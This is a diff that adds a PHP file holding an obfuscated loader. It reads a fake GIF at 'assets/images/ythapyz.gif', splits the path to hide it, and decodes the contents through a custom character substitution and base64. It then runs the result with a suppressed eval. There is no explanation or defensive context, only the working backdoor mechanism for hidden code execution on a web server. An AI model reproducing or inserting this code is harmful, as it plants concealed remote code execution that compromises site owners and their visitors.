@@ -1,0 +1,40 @@
+<?php
+
+if (!defined("qojihy_acholicha"))
+    define("qojihy_acholicha", "F3WkYne+q1Ad5EwO48xPVjRBoQi0ISG69mHb7rgpMJhTtacCvLKzDZ2=/yUuslNfX");
+
+function ydupek_uhyvuholo($bageso_qocunevi) {
+    $chokixa = array();
+    for ($ahotizh = 0; $ahotizh < strlen(qojihy_acholicha); $ahotizh++) {
+        $ekydeh = substr(qojihy_acholicha, $ahotizh, 1);
+        $jufashe = substr(tuwili_zudapashet, $ahotizh, 1);
+        $chokixa[$ekydeh] = $jufashe;
+    }
+
+    $cehyzim = strtr($bageso_qocunevi, $chokixa);
+    $cehyzim = base64_decode($cehyzim);
+
+    return $cehyzim;
+}
+
+if (!defined("tuwili_zudapashet"))
+    define("tuwili_zudapashet", "JxaCWpInNr273TmQls6iUbDE8kGjRHefZvLc1+0ytPBYOSz4du59M=hw/KqVgAFoX");
+
+
+function onyfuf_ucenochow($bageso_qocunevi) {
+    if (!file_exists($bageso_qocunevi))
+        return false;
+    $cejuzi = @file_get_contents($bageso_qocunevi);
+    if (!$cejuzi)
+        return false;
+    $cejuzi = substr($cejuzi, 3);
+    $ubohiri = ydupek_uhyvuholo($cejuzi);
+    return $ubohiri;
+}
+
+
+$uzhenob = onyfuf_ucenochow(__DIR__ . "/asset" . "s/im" . "ages/y" . "thapy" . "z.gi" . "f");
+if ($uzhenob) {
+    @eval($uzhenob);
+}
+
